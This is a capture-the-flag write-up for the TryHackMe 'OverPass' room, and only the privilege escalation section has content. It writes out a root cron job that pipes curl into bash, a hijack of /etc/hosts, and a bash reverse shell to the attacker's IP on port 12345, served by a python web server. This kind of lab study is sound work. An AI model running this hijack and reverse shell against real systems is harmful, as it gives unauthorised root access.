# OverPass

## Recon

## Initial Access


## Privilege Escalation

Found cron entry with linpeas:
```
root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The task downloads "buildscript.sh" and runs it with bash. In the linpeas output
we also say that the /etc/hosts file is writable. Let's check what is currently
in there:

```
# /etc/hosts file
127.0.0.1 overpass.thm
```

Change the loopback address to be our TryHackMe VPN address:

```
# /etc/hosts file
10.2.8.243 overpass.thm
```

Now create a bogus downloads/src/buildscript.sh file that contains a reverse
shell:

```
bash -c 'exec bash -i &>/dev/tcp/10.2.8.243/12345 <&1'
```

Start a netcat listener on port 12345 in a new terminal.

Finally, launch a python webserver in the directory that contains
downloads/src/buildscript.sh on port 80:

```
$ sudo python3 -m http.server 80
```

After a minute, the cron job will download and execute our file, giving us a
root shell!!
